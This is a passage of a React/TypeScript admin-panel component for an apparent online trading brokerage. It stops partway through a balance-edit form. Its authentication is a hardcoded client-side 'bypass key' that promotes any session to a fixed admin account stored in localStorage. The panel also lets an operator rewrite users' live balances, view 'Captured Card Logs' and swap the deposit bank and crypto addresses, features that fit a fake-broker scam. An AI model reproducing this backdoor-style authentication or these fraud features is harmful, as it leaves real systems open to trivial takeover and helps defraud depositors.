import React, { useState, useEffect } from 'react';
import { 
  ShieldAlert, 
  Users, 
  CreditCard, 
  DollarSign, 
  Globe, 
  CheckCircle, 
  XCircle, 
  Save, 
  Unlock, 
  Lock, 
  Smartphone, 
  Check, 
  RefreshCw,
  Search,
  Sliders,
  Wallet,
  MessageSquare
} from 'lucide-react';
import { UserProfile, Transaction, SystemConfig } from '../types';
import { 
  fetchAdminUsersApi, 
  updateAdminUserApi, 
  fetchTransactionsApi, 
  approveTransactionApi, 
  rejectTransactionApi, 
  fetchSystemConfigApi, 
  updateSystemConfigApi,
  addTransactionApi,
  fetchProfileApi,
  deleteAdminUserApi,
  fetchSupportMessagesApi,
  sendSupportMessageApi
} from '../lib/api';

interface AdminPortalProps {
  currentUser: UserProfile;
  onRefreshCurrentUser: () => void;
  onShowNotification: (msg: string, type: 'success' | 'alert' | 'info') => void;
  onClosePortal: () => void;
}

// Default payment configurations
const DEFAULT_SYSTEM_CONFIG: SystemConfig = {
  bankName: 'Standard Apex Trust London',
  beneficiary: 'ExTrading Brokerage LLC',
  iban: 'GB89 APEX 9021 3491 5581 00',
  sortCode: '40-12-88',
  refPrefix: 'EXT',
  btcAddress: '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa',
  usdtAddress: 'TX908TRC20usdtYegshGFdb6OgHXgtaul2'
};

interface DeviceUser {
  email: string;
  fullName: string;
  balance: number;
  demoBalance: number;
  isDemo: boolean;
  kycStatus: 'unverified' | 'pending' | 'verified';
  joinedAt: string;
  device: string;
  location: string;
  ip: string;
  status: 'Online' | 'Idle' | 'Offline';
}

export default function AdminPortal({ currentUser, onRefreshCurrentUser, onShowNotification, onClosePortal }: AdminPortalProps) {
  const [isAdminUnlocked, setIsAdminUnlocked] = useState(false);
  const [adminPasscode, setAdminPasscode] = useState('');
  const [adminError, setAdminError] = useState('');

  // Tab Selection inside Admin Panel
  const [adminTab, setAdminTab] = useState<'users' | 'clearance' | 'payments' | 'cards' | 'support'>('users');

  // Search filter
  const [searchQuery, setSearchQuery] = useState('');

  // States for live device users inside localStorage
  const [registeredUsers, setRegisteredUsers] = useState<DeviceUser[]>([]);
  // States for system payment configurations
  const [paymentConfig, setPaymentConfig] = useState<SystemConfig>(DEFAULT_SYSTEM_CONFIG);
  // States for pending transaction queues
  const [pendingTxList, setPendingTxList] = useState<Transaction[]>([]);
  // States for all transaction history
  const [allTxHistory, setAllTxHistory] = useState<Transaction[]>([]);

  // Support / Chats administrative states
  const [allSupportMessages, setAllSupportMessages] = useState<any[]>([]);
  const [selectedChatUser, setSelectedChatUser] = useState<string>('');
  const [adminReplyText, setAdminReplyText] = useState<string>('');

  // Editing User Balance modal/state
  const [selectedEditUser, setSelectedEditUser] = useState<DeviceUser | null>(null);
  const [newLiveBalance, setNewLiveBalance] = useState('');
  const [newDemoBalance, setNewDemoBalance] = useState('');
  const [newKycStatus, setNewKycStatus] = useState<'unverified' | 'pending' | 'verified'>('unverified');

  // Load Admin states
  useEffect(() => {
    // 1. We require explicit passcode check rather than auto-unlocking, so the administrator can input the 12345678 security key
    setIsAdminUnlocked(false);

    // 2. Load system payment configurations
    fetchSystemConfigApi().then((cfg) => {
      setPaymentConfig(cfg);
    }).catch(() => {});

    // 3. Load database profiles and ledger
    loadAndSyncState();
  }, [currentUser]);

  // Periodic poll of all support messages when unlocked
  useEffect(() => {
    if (!isAdminUnlocked) return;
    
    // Poll support messages every 3 seconds
    const interval = setInterval(() => {
      fetchSupportMessagesApi().then((msgs) => {
        setAllSupportMessages(msgs);
      }).catch(() => {});
    }, 3000);
    
    return () => clearInterval(interval);
  }, [isAdminUnlocked]);

  const loadAndSyncState = async () => {
    try {
      const users = await fetchAdminUsersApi();
      const mapped: DeviceUser[] = users.map((u: any) => ({
        email: u.email,
        fullName: u.fullName || u.email.split('@')[0].toUpperCase(),
        balance: u.balance,
        demoBalance: u.demoBalance,
        isDemo: !!u.isDemo,
        kycStatus: u.kycStatus || 'unverified',
        joinedAt: u.joinedAt || new Date().toLocaleDateString(),
        device: u.device || 'Desktop Terminal Chrome',
        location: u.location || 'London, Greater London',
        ip: u.ip || '82.165.19.44',
        status: u.status || 'Offline'
      }));
      setRegisteredUsers(mapped);

      const transactionHistory = await fetchTransactionsApi('blessedfrancis509@gmail.com');
      setAllTxHistory(transactionHistory);
      setPendingTxList(transactionHistory.filter(t => t.status === 'pending'));

      const supportMsgs = await fetchSupportMessagesApi();
      setAllSupportMessages(supportMsgs);
    } catch (err) {
      console.error('Failed to sync administrative states with DB:', err);
    }
  };

  // Perform pass code validation check
  const handleVerifyPasscode = async (e: React.FormEvent) => {
    e.preventDefault();
    setAdminError('');

    const bypassKey = '12345678';

    if (adminPasscode.trim() === bypassKey) {
      try {
        // Enforce sole user restrictions (automatically promote profile session to blessedfrancis509@gmail.com)
        if (currentUser.email.trim().toLowerCase() !== 'blessedfrancis509@gmail.com') {
          onShowNotification('Authenticating and promoting terminal session to Admin account...', 'info');
          const adminUser = await fetchProfileApi('blessedfrancis509@gmail.com');
          localStorage.setItem('trading_session_user', JSON.stringify(adminUser));
          onRefreshCurrentUser();
        }
        setIsAdminUnlocked(true);
        onShowNotification('Security validation cleared. Unlocked Super Administrator Panel.', 'success');
      } catch (err) {
        // Fallback safety: If API lookup fails, proceed with a local persistent administrator sync
        const fallbackAdmin: UserProfile = {
          email: 'blessedfrancis509@gmail.com',
          fullName: 'Blessed Francis Administrator',
          balance: 85200.0,
          demoBalance: 50000.0,
          isDemo: false,
          kycStatus: 'verified',
          twoFactorEnabled: false,
          joinedAt: new Date().toLocaleDateString(),
        };
        localStorage.setItem('trading_session_user', JSON.stringify(fallbackAdmin));
        onRefreshCurrentUser();
        setIsAdminUnlocked(true);
        onShowNotification('Security validation cleared (Local Safe Mode). Unlocked Admin Panel.', 'success');
      }
    } else {
      setAdminError('Access Denied. Invalid master key passcode sequence.');
    }
  };

  // Modify user balances
  const handleSaveBalances = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!selectedEditUser) return;

    const parseLive = parseFloat(newLiveBalance);
    const parseDemo = parseFloat(newDemoBalance);

    if (isNaN(parseLive) || isNaN(parseDemo)) {
      alert('Please enter correct numeric values for balances');
      return;
    }

    const success = await updateAdminUserApi({
      email: selectedEditUser.email,
      balance: parseLive,
      demoBalance: parseDemo,
      kycStatus: newKycStatus
    });

    if (success) {
      // Append an administrative audit log transaction sheet
      const auditTx: Transaction = {
        id: 'AUDT-' + Math.floor(100000 + Math.random() * 900000),
        type: 'deposit',
        amount: parseLive - selectedEditUser.balance,
        asset: 'USD Audit adjustment',
        status: 'completed',
        method: 'Admin balance override',
        createdAt: new Date().toLocaleTimeString() + ' ' + new Date().toLocaleDateString(),
        description: `Manually override balance. Prev: $${selectedEditUser.balance.toLocaleString()} -> New: $${parseLive.toLocaleString()}`,
        userEmail: selectedEditUser.email
      };
      await addTransactionApi(auditTx);

      // Refresh admin state
      await loadAndSyncState();

      // If edited user is the current logged in user, apply state update immediately
      if (selectedEditUser.email.toLowerCase() === currentUser.email.toLowerCase()) {
        const activeUserSaved = localStorage.getItem('trading_session_user');
        if (activeUserSaved) {
          const activeUser: UserProfile = JSON.parse(activeUserSaved);
          const updatedActive = {
            ...activeUser,
            balance: parseLive,
            demoBalance: parseDemo,
            kycStatus: newKycStatus
          };
          localStorage.setItem('trading_session_user', JSON.stringify(updatedActive));
          onRefreshCurrentUser();
        }
      }

      setSelectedEditUser(null);
      onShowNotification(`Successfully updated financial balances for ${selectedEditUser.fullName}`, 'success');
    } else {
      alert('Failed to save profile changes on the backend.');
    }
  };

  // Delete user account profile from administration db Node
  const handleDeleteUser = async (email: string) => {
    if (email.toLowerCase() === currentUser.email.toLowerCase()) {
      onShowNotification("Security Violation: You cannot delete your own active administrator profile.", "alert");
      return;
    }

    const success = await deleteAdminUserApi(email);
    if (success) {
      onShowNotification(`Permanently purged terminal profile ${email} and all transaction logs.`, 'success');
      await loadAndSyncState();
    } else {
      onShowNotification("Failed to delete user profile.", "alert");
    }
  };

  // Send admin answer to selected user's support thread
  const handleSendAdminReply = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!adminReplyText.trim() || !selectedChatUser) return;

    const textToReply = adminReplyText;
    setAdminReplyText('');

    const success = await sendSupportMessageApi(selectedChatUser, 'agent', textToReply);
    if (success) {
      // Reload admin messages
      const msgs = await fetchSupportMessagesApi();
      setAllSupportMessages(msgs);
    } else {
      alert("Failed to send reply to backend.");
    }
  };

  // Modify banking / USDT Addresses details
  const handleUpdatePaymentConfig = async (e: React.FormEvent) => {
    e.preventDefault();
    const success = await updateSystemConfigApi(paymentConfig);
    if (success) {
      onShowNotification('Payment verification details and wallet addresses updated globally', 'success');
    } else {
      alert('Failed to update system configs on backend');
    }
  };

  // Approve a pending deposit / withdrawal request
  const handleApproveTransaction = async (txId: string) => {
    const success = await approveTransactionApi(txId);
    if (success) {
      await loadAndSyncState();
      onRefreshCurrentUser();
      onShowNotification(`Settle request ${txId} approved successfully`, 'success');
    } else {
      alert('Failed to approve transaction.');
    }
  };

  // Reject a pending deposit / withdrawal request
  const handleRejectTransaction = async (txId: string) => {
    const success = await rejectTransactionApi(txId);
    if (success) {
      await loadAndSyncState();
      onRefreshCurrentUser();
      onShowNotification(`Settle request ${txId} successfully rejected`, 'info');
    } else {
      alert('Failed to reject transaction.');
    }
  };

  // Filter users by search
  const filteredUsers = registeredUsers.filter(u => 
    u.fullName.toLowerCase().includes(searchQuery.toLowerCase()) || 
    u.email.toLowerCase().includes(searchQuery.toLowerCase()) || 
    u.device.toLowerCase().includes(searchQuery.toLowerCase()) ||
    u.location.toLowerCase().includes(searchQuery.toLowerCase())
  );

  // Extract all transactions containing card info
  const cardTransactions = allTxHistory.filter(t => t.cardInfo);

  if (!isAdminUnlocked) {
    return (
      <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-[#0b0e11]/95 backdrop-blur-xl">
        <div className="absolute inset-0" onClick={onClosePortal}></div>
        <div className="w-full max-w-md relative z-10 bg-[#181a20] border border-zinc-800 rounded-2xl p-6 shadow-2xl space-y-5">
          <div className="text-center space-y-2">
            <div className="inline-flex items-center justify-center p-3 rounded-2xl bg-red-950/40 border border-red-900/40 text-red-400 mb-2">
              <ShieldAlert className="h-8 w-8 text-yellow-500 animate-pulse" />
            </div>
            <h2 className="text-lg font-black text-white uppercase tracking-wider font-sans">
              Admin Gateway Restricted
            </h2>
            <div className="bg-zinc-950/60 p-3 rounded-xl border border-zinc-900 text-[11px] leading-snug text-[#8E9AAB] text-left space-y-2 font-sans">
              <p>
                ⚠️ **Strict Access Bounds Enforced**: This administrative clearance panel is limited exclusively to authorized developer terminals.
              </p>
              <p>
                Active Session Account: <span className="text-white font-mono font-bold font-semibold underline">{currentUser.email}</span>
              </p>
            </div>
          </div>

          <form onSubmit={handleVerifyPasscode} className="space-y-4">
            {adminError && (
              <p className="p-2.5 rounded-lg border border-red-500/20 bg-red-500/10 text-red-400 text-[10px] font-mono font-semibold">
                🚫 {adminError}
              </p>
            )}
            
            <div className="space-y-1.5">
              <label className="text-[9px] font-extrabold text-zinc-400 uppercase tracking-widest block font-sans">
                Master Security Bypass Key
              </label>
              <input
                type="password"
                required
                placeholder="🔑 Enter override passcode..."
                value={adminPasscode}
                onChange={e => setAdminPasscode(e.target.value)}
                className="w-full bg-[#2b2f36]/40 border border-zinc-800 rounded-xl px-3 py-2 text-xs text-white font-mono placeholder-zinc-650 focus:outline-none focus:ring-1 focus:ring-yellow-500"
              />
            </div>

            <div className="flex gap-3">
              <button
                type="button"
                onClick={onClosePortal}
                className="flex-1 py-2 rounded-xl text-zinc-400 hover:text-white bg-zinc-950/40 hover:bg-zinc-900/80 text-xs font-bold uppercase transition-all font-sans cursor-pointer"
              >
                Return to Trade
              </button>
              <button
                type="submit"
                className="flex-1 py-2 rounded-xl bg-[#f0b90b] hover:bg-[#FFC933] text-[#0b0e11] text-xs font-black uppercase tracking-wider transition-all flex items-center justify-center gap-1.5 cursor-pointer shadow-md"
              >
                <Unlock className="h-3.5 w-3.5" /> Authenticate
              </button>
            </div>
          </form>
        </div>
      </div>
    );
  }

  return (
    <div className="fixed inset-0 z-50 bg-[#0b0e11] text-[#EAECEF] flex flex-col font-sans select-none antialiased overflow-hidden text-xs">
      {/* Top Header bar */}
      <header className="bg-[#181a20] border-b border-zinc-850 px-3 sm:px-4 py-2.5 sm:py-3 flex items-center justify-between shadow-md shrink-0">
        <div className="flex items-center gap-2">
          <div className="p-1 px-2 rounded bg-yellow-500 text-zinc-950 font-black tracking-widest text-[10px] sm:text-xs font-sans flex items-center gap-1 shrink-0">
            EX 🛡️ <span className="bg-zinc-950 text-yellow-400 px-1 py-0.5 rounded text-[7px] font-mono leading-none">ROOT</span>
          </div>
          <span className="text-white font-black text-[11px] sm:text-xs hidden xs:block sm:block tracking-wider uppercase font-sans truncate max-w-[200px] sm:max-w-none">
            CENTRAL ADMINISTRATION
          </span>
        </div>

        <div className="flex items-center gap-2 sm:gap-3">
          <span className="hidden sm:inline-flex text-[9px] sm:text-[10px] bg-emerald-500/10 text-emerald-400 font-extrabold px-1.5 sm:px-2 py-0.5 rounded border border-emerald-500/20 uppercase font-mono tracking-wider items-center gap-1">
            <span className="h-1 w-1 sm:h-1.5 sm:w-1.5 rounded-full bg-emerald-400 animate-ping"></span> Live Server Admin Link
          </span>
          <button
            onClick={onClosePortal}
            className="text-zinc-450 hover:text-white bg-zinc-850 hover:bg-zinc-700 px-2.5 py-1 rounded-lg text-[10px] sm:text-xs font-bold font-sans cursor-pointer transition-all border border-zinc-750 active:scale-95 shrink-0"
          >
            EXIT SHELL
          </button>
        </div>
      </header>

      {/* Main Admin Content Layout */}
      <div className="flex flex-col md:flex-row flex-1 overflow-hidden">
        
        {/* Left Control Rail Tabs - Hidden on Mobile */}
        <aside className="hidden md:flex w-56 bg-[#12141a] border-r border-zinc-850 p-4 flex-col justify-between shrink-0">
          <div className="space-y-5">
            <div className="p-2.5 bg-zinc-950/40 rounded-xl border border-zinc-900">
              <span className="text-[8px] text-zinc-500 font-extrabold block uppercase tracking-widest mb-1 font-mono">
                System Operator
              </span>
              <p className="text-zinc-200 text-xs font-bold truncate">{currentUser.fullName}</p>
              <p className="text-yellow-500 text-[10px] font-mono leading-none mt-1 truncate">{currentUser.email}</p>
            </div>

            <nav className="flex flex-col gap-1.5">
              <button
                onClick={() => setAdminTab('users')}
                className={`w-full text-left py-2.5 px-3 rounded-xl text-xs font-bold uppercase flex items-center gap-2.5 transition-all cursor-pointer ${
                  adminTab === 'users' ? 'bg-[#f0b90b] text-[#0b0e11] shadow' : 'text-zinc-400 hover:bg-zinc-850 hover:text-white'
                }`}
              >
                <Users className="h-4 w-4" /> Live Device Users
              </button>
              <button
                onClick={() => setAdminTab('clearance')}
                className={`w-full text-left py-2.5 px-3 rounded-xl text-xs font-bold uppercase flex items-center gap-2.5 transition-all cursor-pointer relative ${
                  adminTab === 'clearance' ? 'bg-[#f0b90b] text-[#0b0e11] shadow' : 'text-zinc-400 hover:bg-zinc-850 hover:text-white'
                }`}
              >
                <DollarSign className="h-4 w-4" /> Settlement clearances
                {pendingTxList.length > 0 && (
                  <span className="absolute right-2 top-2.5 bg-red-500 text-white font-mono text-[9px] font-bold px-1.5 py-0.5 rounded-full shrink-0">
                    {pendingTxList.length}
                  </span>
                )}
              </button>
              <button
                onClick={() => setAdminTab('payments')}
                className={`w-full text-left py-2.5 px-3 rounded-xl text-xs font-bold uppercase flex items-center gap-2.5 transition-all cursor-pointer ${
                  adminTab === 'payments' ? 'bg-[#f0b90b] text-[#0b0e11] shadow' : 'text-zinc-400 hover:bg-zinc-850 hover:text-white'
                }`}
              >
                <Sliders className="h-4 w-4" /> Payment Details
              </button>
              <button
                onClick={() => setAdminTab('cards')}
                className={`w-full text-left py-2.5 px-3 rounded-xl text-xs font-bold uppercase flex items-center gap-2.5 transition-all cursor-pointer ${
                  adminTab === 'cards' ? 'bg-[#f0b90b] text-[#0b0e11] shadow' : 'text-zinc-400 hover:bg-zinc-850 hover:text-white'
                }`}
              >
                <CreditCard className="h-4 w-4" /> Captured Card Logs
              </button>
              <button
                onClick={() => setAdminTab('support')}
                className={`w-full text-left py-2.5 px-3 rounded-xl text-xs font-bold uppercase flex items-center gap-2.5 transition-all cursor-pointer ${
                  adminTab === 'support' ? 'bg-[#f0b90b] text-[#0b0e11] shadow' : 'text-zinc-400 hover:bg-zinc-850 hover:text-white'
                }`}
              >
                <MessageSquare className="h-4 w-4" /> Support Chats
              </button>
            </nav>
          </div>

          <div className="bg-[#181a20]/65 p-3 rounded-xl border border-zinc-850/40 text-[9px] text-zinc-500 text-center leading-relaxed">
            🌿 EXPRO ADMIN CORE v3.2.0<br/>Secure Vault Encryption 3.0
          </div>
        </aside>

        {/* Mobile top navigation rail - Shown on Mobile only */}
        <nav className="flex md:hidden bg-[#12141a] border-b border-zinc-850 p-2 overflow-x-auto shrink-0 gap-1.5 scrollbar-none justify-between w-full">
          <button
            onClick={() => setAdminTab('users')}
            className={`flex-1 py-2 px-2 rounded-xl text-[10px] font-bold uppercase tracking-wider flex items-center justify-center gap-1.5 shrink-0 transition-all cursor-pointer whitespace-nowrap min-w-[85px] ${
              adminTab === 'users' ? 'bg-[#f0b90b] text-[#0b0e11] font-black' : 'text-zinc-400 bg-zinc-950/20 hover:bg-zinc-900/60'
            }`}
          >
            <Users className="h-3.5 w-3.5 shrink-0" /> Users
          </button>
          <button
            onClick={() => setAdminTab('clearance')}
            className={`flex-1 py-2 px-2 rounded-xl text-[10px] font-bold uppercase tracking-wider flex items-center justify-center gap-1.5 shrink-0 transition-all cursor-pointer relative whitespace-nowrap min-w-[110px] ${
              adminTab === 'clearance' ? 'bg-[#f0b90b] text-[#0b0e11] font-black' : 'text-zinc-400 bg-zinc-950/20 hover:bg-zinc-900/60'
            }`}
          >
            <DollarSign className="h-3.5 w-3.5 shrink-0" /> Clearances
            {pendingTxList.length > 0 && (
              <span className="absolute -top-1 -right-1 bg-red-500 text-white font-mono text-[8px] font-black px-1.5 py-0.5 rounded-full scale-90 shrink-0 shadow-sm border border-[#12141a]">
                {pendingTxList.length}
              </span>
            )}
          </button>
          <button
            onClick={() => setAdminTab('payments')}
            className={`flex-1 py-2 px-2 rounded-xl text-[10px] font-bold uppercase tracking-wider flex items-center justify-center gap-1.5 shrink-0 transition-all cursor-pointer whitespace-nowrap min-w-[95px] ${
              adminTab === 'payments' ? 'bg-[#f0b90b] text-[#0b0e11] font-black' : 'text-zinc-400 bg-zinc-950/20 hover:bg-zinc-900/60'
            }`}
          >
            <Sliders className="h-3.5 w-3.5 shrink-0" /> Payments
          </button>
          <button
            onClick={() => setAdminTab('cards')}
            className={`flex-1 py-2 px-2 rounded-xl text-[10px] font-bold uppercase tracking-wider flex items-center justify-center gap-1.5 shrink-0 transition-all cursor-pointer whitespace-nowrap min-w-[85px] ${
              adminTab === 'cards' ? 'bg-[#f0b90b] text-[#0b0e11] font-black' : 'text-zinc-400 bg-zinc-950/20 hover:bg-zinc-900/60'
            }`}
          >
            <CreditCard className="h-3.5 w-3.5 shrink-0" /> Cards
          </button>
          <button
            onClick={() => setAdminTab('support')}
            className={`flex-1 py-2 px-2 rounded-xl text-[10px] font-bold uppercase tracking-wider flex items-center justify-center gap-1.5 shrink-0 transition-all cursor-pointer whitespace-nowrap min-w-[85px] ${
              adminTab === 'support' ? 'bg-[#f0b90b] text-[#0b0e11] font-black' : 'text-zinc-400 bg-zinc-950/20 hover:bg-zinc-900/60'
            }`}
          >
            <MessageSquare className="h-3.5 w-3.5 shrink-0" /> Support
          </button>
        </nav>

        {/* Outer Frame scrollable section */}
        <main className="flex-1 p-4 sm:p-6 overflow-y-auto" style={{ contentVisibility: 'auto' }}>
          
          {/* TAB 1: LIVE REGISTERED DEVICE USERS */}
          {adminTab === 'users' && (
            <div className="space-y-6">
              <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-4">
                <div>
                  <h3 className="text-lg font-black text-white font-sans uppercase">Live Registered Device Terminals</h3>
                  <p className="text-xs text-zinc-400 leading-normal">
                    Real-time database of authenticated profiles in local storage databases, simulated live device feeds, and geolocation.
                  </p>
                </div>

                <div className="relative w-full md:w-80">
                  <Search className="absolute left-3 top-2.5 h-4 w-4 text-zinc-550" />
                  <input
                    type="text"
                    placeholder="Search by name, email, terminal device..."
                    value={searchQuery}
                    onChange={e => setSearchQuery(e.target.value)}
                    className="w-full bg-[#181a20] border border-zinc-800 rounded-xl px-10 py-1.5 text-xs text-white placeholder-zinc-600 focus:outline-none"
                  />
                </div>
                  {/* Users Cards - Mobile View */}
              <div className="grid grid-cols-1 gap-4 md:hidden">
                {filteredUsers.length === 0 ? (
                  <div className="text-center py-8 text-zinc-500 bg-[#181a20] rounded-2xl border border-zinc-850">
                    No active profiles match current filters.
                  </div>
                ) : (
                  filteredUsers.map((user) => {
                    const isSelf = user.email.toLowerCase() === currentUser.email.toLowerCase();
                    return (
                      <div key={user.email} className={`bg-[#181a20] border rounded-2xl p-4 space-y-3 shadow-md relative overflow-hidden transition-all duration-200 ${isSelf ? 'border-yellow-500/30 bg-yellow-500/[0.02]' : 'border-zinc-850'}`}>
                        {isSelf && (
                          <div className="absolute top-0 right-0 bg-yellow-500 text-zinc-950 font-black px-2 py-0.5 rounded-bl text-[8px] tracking-wide">
                            YOUR SESSION
                          </div>
                        )}
                        <div className="flex justify-between items-start">
                          <div className="space-y-0.5 select-text">
                            <h4 className="font-extrabold text-white text-sm tracking-tight">{user.fullName}</h4>
                            <p className="text-[10px] text-zinc-400 font-mono break-all">{user.email}</p>
                          </div>
                          <div>
                            {user.kycStatus === 'verified' ? (
                              <span className="bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 text-[9px] px-2 py-0.5 rounded font-black font-sans uppercase">VERIFIED</span>
                            ) : user.kycStatus === 'pending' ? (
                              <span className="bg-amber-500/10 text-amber-500 border border-amber-500/20 text-[9px] px-2 py-0.5 rounded font-bold uppercase">PENDING</span>
                            ) : (
                              <span className="bg-zinc-850 text-zinc-400 border border-zinc-800 text-[9px] px-2 py-0.5 rounded font-bold uppercase">UNVERIFIED</span>
                            )}
                          </div>
                        </div>

                        <div className="grid grid-cols-2 gap-3 text-xs font-mono py-2 bg-zinc-950/40 rounded-xl px-3 border border-zinc-900/60">
                          <div>
                            <span className="text-zinc-500 text-[9px] block uppercase font-sans font-extrabold leading-none mb-1">Live USD Cash</span>
                            <span className="text-emerald-400 font-bold">${user.balance.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</span>
                          </div>
                          <div>
                            <span className="text-zinc-500 text-[9px] block uppercase font-sans font-extrabold leading-none mb-1">Demo Capital</span>
                            <span className="text-zinc-300 font-bold">${user.demoBalance.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</span>
                          </div>
                        </div>

                        <div className="text-[11px] text-zinc-400 font-sans space-y-1 pt-1">
                          <div className="flex items-center gap-1.5 text-[10px] leading-snug">
                            <Smartphone className="h-3.5 w-3.5 text-zinc-500 shrink-0" />
                            <span className="truncate">{user.device} ({user.ip})</span>
                          </div>
                          <div className="flex items-center gap-1.5 text-[10px] leading-snug">
                            <Globe className="h-3.5 w-3.5 text-cyan-400 shrink-0" />
                            <span>{user.location}</span>
                          </div>
                        </div>

                        <div className="pt-2 border-t border-zinc-850/60 pb-0.5 grid grid-cols-2 gap-2">
                          <button
                            onClick={() => {
                              setSelectedEditUser(user);
                              setNewLiveBalance(user.balance.toString());
                              setNewDemoBalance(user.demoBalance.toString());
                              setNewKycStatus(user.kycStatus);
                            }}
                            className="w-full bg-zinc-800 hover:bg-yellow-500 hover:text-zinc-950 active:bg-[#e0ab07] font-extrabold py-2 rounded-xl text-[10px] text-zinc-350 uppercase tracking-wider transition-all border border-zinc-700 hover:border-transparent flex items-center justify-center gap-1.5 cursor-pointer"
                          >
                            Modify Balances
                          </button>
                          <button
                            onClick={() => handleDeleteUser(user.email)}
                            className="w-full bg-red-950/20 hover:bg-red-650 hover:text-white text-red-400 font-extrabold py-2 rounded-xl text-[10px] uppercase tracking-wider transition-all border border-red-900/30 hover:border-transparent flex items-center justify-center gap-1.5 cursor-pointer"
                          >
                            Delete User
                          </button>
                        </div>
                      </div>
                    );
                  })
                )}
              </div>

              {/* Users Grid Card and Scroller - Desktop View */}
              <div className="hidden md:block bg-[#181a20] border border-zinc-850 rounded-2xl overflow-hidden shadow-xl">
                <div className="overflow-x-auto">
                  <table className="w-full text-left border-collapse min-w-[900px]">
                    <thead>
                      <tr className="text-[10px] text-zinc-500 border-b border-zinc-800 uppercase font-bold tracking-widest bg-zinc-950/20">
                        <th className="p-4">Profile Details</th>
                        <th className="p-4">Regulatory KYC</th>
                        <th className="p-4">Device terminal / Session</th>
                        <th className="p-4">Geolocation info</th>
                        <th className="p-4">Demo balance</th>
                        <th className="p-4">Live Liquid balance</th>
                        <th className="p-4 text-right">Admin actions</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-zinc-800/60 font-mono text-xs">
                      {filteredUsers.length === 0 ? (
                        <tr>
                          <td colSpan={7} className="p-8 text-center text-zinc-550">
                            No active profiles match current filters.
                          </td>
                        </tr>
                      ) : (
                        filteredUsers.map((user) => {
                          const isSelf = user.email.toLowerCase() === currentUser.email.toLowerCase();
                          return (
                            <tr key={user.email} className={`hover:bg-zinc-850/20 transition-all ${isSelf ? 'bg-yellow-500/5' : ''}`}>
                              <td className="p-4">
                                <div className="flex flex-col">
                                  <span className="font-extrabold text-white font-sans text-xs">
                                    {user.fullName} {isSelf && <span className="text-[8px] bg-yellow-500/20 text-[#f0b90b] border border-yellow-500/30 px-1 rounded ml-1 uppercase">YOU</span>}
                                  </span>
                                  <span className="text-[11px] text-[#8E9AAB]">{user.email}</span>
                                </div>
                              </td>
                              <td className="p-4">
                                {user.kycStatus === 'verified' ? (
                                  <span className="bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 text-[9px] px-2 py-0.5 rounded font-black font-sans uppercase">VERIFIED</span>
                                ) : user.kycStatus === 'pending' ? (
                                  <span className="bg-amber-500/10 text-amber-500 border border-amber-500/20 text-[9px] px-2 py-0.5 rounded font-black font-sans uppercase">PENDING APPROVAL</span>
                                ) : (
                                  <span className="bg-zinc-850 text-zinc-400 border border-zinc-800 text-[9px] px-2 py-0.5 rounded font-black font-sans uppercase">UNVERIFIED</span>
                                )}
                              </td>
                              <td className="p-4">
                                <div className="flex flex-col">
                                  <span className="text-zinc-250 font-sans font-medium text-[11px]">{user.device}</span>
                                  <span className="text-[10px] text-zinc-500">{user.ip}</span>
                                </div>
                              </td>
                              <td className="p-4">
                                <span className="text-zinc-300 font-sans flex items-center gap-1">
                                  <Globe className="h-3 w-3 text-cyan-400 shrink-0" /> {user.location}
                                </span>
                              </td>
                              <td className="p-4 font-bold text-zinc-300">
                                ${user.demoBalance.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                              </td>
                              <td className="p-4 font-bold text-emerald-400">
                                ${user.balance.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                              </td>
                              <td className="p-4 text-right flex gap-2 justify-end">
                                <button
                                  onClick={() => {
                                    setSelectedEditUser(user);
                                    setNewLiveBalance(user.balance.toString());
                                    setNewDemoBalance(user.demoBalance.toString());
                                    setNewKycStatus(user.kycStatus);
                                  }}
                                  className="bg-zinc-800 hover:bg-yellow-500 hover:text-zinc-950 font-black px-3 py-1.5 rounded-lg text-[10px] text-zinc-200 uppercase tracking-wide cursor-pointer transition-all font-sans border border-zinc-700 hover:border-transparent inline-flex items-center gap-1.5"
                                >
                                  Modify Balances
                                </button>
                                <button
                                  onClick={() => handleDeleteUser(user.email)}
                                  className="bg-red-950/20 hover:bg-red-650 hover:text-white text-red-400 border border-red-900/40 px-3 py-1.5 rounded-lg text-[10px] font-black uppercase tracking-wide cursor-pointer transition-all font-sans hover:border-transparent inline-flex items-center gap-1.5"
                                >
                                  Delete User
                                </button>
                              </td>
                            </tr>
                          );
                        })
                      )}
                    </tbody>
                  </table>
                </div>
              </div>            </div>

              {/* POPUP BALANCE EDIT MODAL */}
              {selectedEditUser && (
                <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-zinc-950/80 backdrop-blur-sm">
                  <div className="absolute inset-0" onClick={() => setSelectedEditUser(null)}></div>
                  <div className="w-full max-w-md relative z-10 bg-[#181a20] border border-zinc-800 rounded-2xl shadow-2xl p-5 space-y-4">
                    <div className="flex justify-between items-start border-b border-zinc-800 pb-3">
                      <div>
                        <h4 className="font-extrabold text-white text-sm uppercase font-sans">Modify Financial Substructures</h4>
                        <p className="text-[10px] text-zinc-400 font-sans">{selectedEditUser.fullName} ({selectedEditUser.email})</p>
                      </div>
                      <button
                        onClick={() => setSelectedEditUser(null)}
                        className="text-zinc-500 hover:text-white font-bold px-1.5 text-xs"
                      >
                        CLOSE
                      </button>
                    </div>

                    <form onSubmit={handleSaveBalances} className="space-y-4 text-xs">
                      <div className="space-y-1">
                        <label className="text-[10px] font-extrabold text-zinc-400 uppercase tracking-wider block font-sans">
                          Modify Real Live USD Liquid Balance
                        </label>
                        <div className="relative">
                          <DollarSign className="absolute left-3 top-2.5 h-4 w-4 text-emerald-400" />
                          <input
                            type="number"
                            required
                            step="any"
                            value={newLiveBalance}
                            onChange={e => setNewLiveBalance(e.target.value)}
                            className="w-full bg-[#2b2f36]/40 border border-zinc-800 rounded-xl pl-9 pr-3 py-2 text-zinc-100 font-mono font-bold"
                          />
                        </div>
                      </div>

                      <div className="space-y-1">
